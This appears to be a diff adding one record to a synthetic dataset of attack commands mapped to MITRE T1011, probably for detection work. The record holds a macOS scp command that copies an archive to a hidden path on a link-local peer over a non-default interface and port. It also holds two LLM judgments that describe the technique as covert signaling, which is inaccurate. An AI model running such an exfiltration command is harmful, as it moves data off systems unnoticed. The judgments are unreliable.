@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
+  "explanation": "Uses SSH file copy bound to the bridge0 interface IPv6 address and a high custom port to move data over a bridged, non-default medium, aligning with T1011 by avoiding the primary interface.",
+  "rationale_steps": [
+    "Obtain the IPv6 address of bridge0 via ipconfig to select a secondary medium.",
+    "Bind the SSH client to that address to force traffic over bridge0.",
+    "Transfer data to a link-local peer on a non-standard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-8073e46c",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed scp command with valid flags, balanced quoting, command substitution, and correct IPv6 bracket/zone syntax.",
+        "semantic_score": 2,
+        "semantic_justification": "While it plausibly transfers the file via SSH bound to the bridge0 IPv6 address and nonstandard port, it does not embed or convey covert signals in traffic as required by T1011, so alignment with the technique is weak.",
+        "combined_score": 3.5,
+        "confidence": 0.76,
+        "timestamp": "2025-10-01T14:29:36.246132Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed for Bash on macOS, utilizing correct `scp` flags, valid command substitution for `BindAddress`, and a properly formatted IPv6 link-local destination with a zone ID.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively demonstrates traffic signaling by using a non-default bridge interface (`bridge0`), a link-local IPv6 address, and a high custom port for `scp`, all of which align with T1011's objective of evading monitoring and coordinating actions through an unexpected communication channel.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T14:29:56.667442Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.5,
+    "llm_average_score": 4.25,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
